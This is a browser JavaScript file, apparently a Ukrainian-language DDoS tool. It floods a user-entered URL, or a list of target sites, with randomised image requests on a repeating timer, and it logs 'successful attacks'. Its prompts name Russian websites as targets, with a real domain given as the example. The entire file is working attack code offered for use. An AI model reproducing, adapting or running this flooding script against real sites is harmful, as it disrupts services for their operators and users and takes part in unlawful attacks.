const inputUrl = document.querySelector('.url')
const inputCounter = document.querySelector('.counter')
const logList = document.querySelector('.log__list')
const logItem = document.querySelector('.log__item')
const mainForm = document.querySelector('.mainForm')
const totalRequests = document.querySelector('.log__requests-input')
const totalResponses = document.querySelector('.log__responses-input')
const tergets = document.querySelectorAll('.info__item')
const btnAll = document.querySelector('.attackAll')
let attackInterval
function getCounter() {
  const counter = inputCounter.value ? parseInt(inputCounter.value) : 0
  if (isNaN(counter)) alert('Введіть кількість завдань для кожного циклу')
  return counter
}
function generateId() {
  return Math.random().toString(36).slice(-5)
}
function writeToLog(text) {
  const logElement = document.createElement('li')
  logElement.innerText = text
  logElement.className = 'log__item'
  logList.insertAdjacentElement('afterbegin', logElement)
}
function timestamp() {
  const Data = new Date()
  const Year = Data.getFullYear()
  let Month = Data.getMonth() + 1
  if (Month < 10) Month = '0' + Month
  const Day = Data.getDate() < 10 ? '0' + Data.getDate() : Data.getDate()
  const Hour = Data.getHours() < 10 ? '0' + Data.getHours() : Data.getHours()
  const Minutes = Data.getMinutes() < 10 ? '0' + Data.getMinutes() : Data.getMinutes()
  const Seconds = Data.getSeconds() < 10 ? '0' + Data.getSeconds() : Data.getSeconds()
  return Year + '.' + Month + '.' + Day + ' - ' + Hour + ':' + Minutes + ':' + Seconds
}

function attack(url) {
  for (let i = 1; i <= getCounter(); i++) {
    const image = new Image()
    image.onerror = function (e) {
      let urlLog = e.path[0].currentSrc.slice(8).split('/')[0]
      if (btnAll.className === 'mainForm__button attackAll isWorking') {
        writeToLog(timestamp() + ' - вдала атака на "' + urlLog + '". Чекайте. ')
      }
      totalResponses.value++
    }
    image.src = url + '/' + generateId() + '?' + generateId() + '=' + Math.floor(Math.random() * 1000)
    totalRequests.value++
  }
  writeToLog(
    timestamp() +
      ' - на "' +
      url +
      '" відправлено ' +
      getCounter() +
      ' запитів. Не закривайте сторінку. Чекайте, хай відповість.',
  )
}

function mainFormSubmit(e) {
  e.preventDefault()
  const url = inputUrl.value.toLowerCase()
  if (!url) alert('Введіть адресу рашиського сайту. Наприклад "https://goszakaz.ru/"')

  attack(url)
}

function groupAttack() {
  tergets.forEach(target => {
    const url = target.innerHTML
    attack(url)
  })
}

function attackAll(e) {
  e.preventDefault()
  btnAll.classList.toggle('isWorking')

  if (btnAll.className === 'mainForm__button attackAll isWorking') {
    groupAttack()
    attackInterval = setInterval(groupAttack, getCounter() * 5000)
    writeToLog(timestamp() + ' - цикл запущено.')
    btnAll.textContent = 'Зупинити'
  } else {
    clearInterval(attackInterval)
    writeToLog(timestamp() + ' - цикл вимкнено. Відповіді будуть ще повертатись. Дивись лічильник')
    btnAll.textContent = 'Запустити циклічну атаку по актуальним сайтам'
  }
}

mainForm.addEventListener('submit', mainFormSubmit)
btnAll.addEventListener('click', attackAll)
